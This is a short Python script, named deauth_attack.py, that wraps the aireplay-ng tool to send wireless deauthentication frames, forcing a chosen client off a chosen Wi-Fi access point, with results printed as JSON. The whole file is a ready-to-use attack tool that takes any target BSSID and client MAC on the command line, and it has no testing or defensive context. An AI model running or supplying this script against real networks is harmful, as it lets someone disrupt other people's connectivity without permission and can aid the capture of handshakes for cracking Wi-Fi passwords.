#!/usr/bin/env python3
import subprocess
import json
import sys
from datetime import datetime

def send_deauth_packets(target_bssid, client_mac, interface="wlan0mon"):
    try:
        result = subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", target_bssid, "-c", client_mac, interface],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        return json.dumps({
            "timestamp": datetime.now().isoformat(),
            "status": "complete",
            "output": result.stdout,
            "errors": result.stderr
        })

    except Exception as e:
        return json.dumps({
            "timestamp": datetime.now().isoformat(),
            "status": "exception",
            "message": str(e)
        })

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(json.dumps({
            "timestamp": datetime.now().isoformat(),
            "status": "error",
            "message": "Usage: deauth_attack.py <target_bssid> <client_mac> [interface]"
        }))
        sys.exit(1)

    bssid = sys.argv[1]
    client = sys.argv[2]
    iface = sys.argv[3] if len(sys.argv) > 3 else "wlan0mon"

    print(json.dumps({
        "timestamp": datetime.now().isoformat(),
        "status": "starting",
        "message": f"Launching deauth attack on {client} from {bssid} via {iface}..."
    }))

    result = send_deauth_packets(bssid, client, iface)
    print(result)